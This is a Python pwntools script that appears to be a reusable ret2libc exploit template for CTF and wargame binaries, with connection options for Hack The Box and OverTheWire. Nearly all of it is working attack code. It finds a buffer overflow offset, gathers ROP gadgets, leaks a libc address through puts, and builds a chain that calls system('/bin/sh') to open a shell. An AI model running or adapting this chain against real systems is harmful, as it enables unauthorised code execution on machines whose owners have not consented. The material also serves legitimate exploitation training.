from pwn import * # Import pwntools


###################
### CONNECTION ####
###################
LOCAL = True
REMOTETTCP = False
REMOTESSH = False
GDB = False

local_bin = "./vuln"
remote_bin = "~/vuln" #For ssh
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6") #Set library path when know it

if LOCAL:
    p = process(local_bin) # start the vuln binary
    elf = ELF(local_bin)# Extract data from binary
    rop = ROP(elf)# Find ROP gadgets

elif REMOTETTCP:
    p = remote('docker.hackthebox.eu',31648) # start the vuln binary
    elf = ELF(local_bin)# Extract data from binary
    rop = ROP(elf)# Find ROP gadgets

elif REMOTESSH:
    ssh_shell = ssh('bandit0', 'bandit.labs.overthewire.org', password='bandit0', port=2220)
    p = ssh_shell.process(remote_bin) # start the vuln binary
    elf = ELF(local_bin)# Extract data from binary
    rop = ROP(elf)# Find ROP gadgets


if GDB:
    # attach gdb and continue
    # You can set breakpoints, for example "break *main"
    gdb.attach(p.pid, "continue")


###################
### Find offset ###
###################
OFFSET = "A"*40
if OFFSET == "":
    gdb.attach(p.pid, "c") #Attach and continue
    payload = cyclic(1000)
    print(p.clean())
    p.sendline(payload)
    #x/wx $rsp -- Search for bytes that crashed the application
    #cyclic_find(0x6161616b) # Find the offset of those bytes
    p.interactive()
    exit()


####################
### Find Gadgets ###
####################
PUTS_PLT = elf.plt['puts'] #PUTS_PLT = elf.symbols["puts"] # This is also valid to call puts
MAIN_PLT = elf.symbols['main']
POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0] #Same as ROPgadget --binary vuln | grep "pop rdi"

log.info("Main start: " + hex(MAIN_PLT))
log.info("Puts plt: " + hex(PUTS_PLT))
log.info("pop rdi; ret  gadget: " + hex(POP_RDI))

def get_addr(func_name):
    FUNC_GOT = elf.got[func_name]
    log.info(func_name + " GOT @ " + hex(FUNC_GOT))
    # Create rop chain
    rop1 = OFFSET + p64(POP_RDI) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)

    #Send our rop-chain payload
    #p.sendlineafter("dah?", rop1) #Interesting to send in a specific moment
    print(p.clean()) # clean socket buffer (read all and print)
    p.sendline(rop1)

    #Parse leaked address
    recieved = p.recvline().strip()
    leak = u64(recieved.ljust(8, "\x00"))
    log.info("Leaked libc address,  "+func_name+": "+ hex(leak))
    #If not libc yet, stop here
    if libc != "":
        libc.address = leak - libc.symbols[func_name] #Save libc base
        log.info("libc base @ %s" % hex(libc.address))
    
    return hex(leak)

get_addr("puts") #Search for puts address in memmory to obtains libc base
if libc == "":
    print("Find the libc library and continue with the exploit... (https://libc.blukat.me/)")
    p.interactive()

# Notice that if a libc was specified the base of the library will be saved in libc.address
# this implies that in the future if you search for functions in libc, the resulting address
# will be the real one, you can use it directly (NOT NEED TO ADD AGAINF THE LIBC BASE ADDRESS)

################################
## GET SHELL with known LIBC ###
################################
BINSH = next(libc.search("/bin/sh")) #Verify with find /bin/sh
SYSTEM = libc.sym["system"]
EXIT = libc.sym["exit"]

log.info("bin/sh %s " % hex(BINSH))
log.info("system %s " % hex(SYSTEM))

rop2 = OFFSET + p64(POP_RDI) + p64(BINSH) + p64(SYSTEM) + p64(EXIT)

p.clean()
p.sendline(rop2)

#### Interact with the shell #####
p.interactive() #Interact with the conenction